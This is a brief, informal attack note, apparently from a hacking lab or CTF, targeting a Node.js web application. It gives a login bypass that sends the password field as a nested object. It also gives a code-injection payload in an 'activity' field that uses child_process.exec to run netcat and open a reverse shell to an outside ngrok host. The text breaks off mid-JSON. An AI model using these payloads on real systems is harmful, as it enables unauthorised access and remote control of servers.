## Normal login
```

  "admin":"admin",
  "password":"password123"
}
```


### And try this
```
{
  "admin":"admin",
  "password":{
    "password":"1"
  }
}
```


in one of the activities for the piece of shit
you cand bypass the child_exec for node, and try to connect
with your tcp console with ngrok and poom, get a shell

```
{
  "activity":"'+(global.process.mainModule.require('child_process').exec('nc 0.tcp.sa.ngrok.io:10464 -e /bin/sh'))+'",
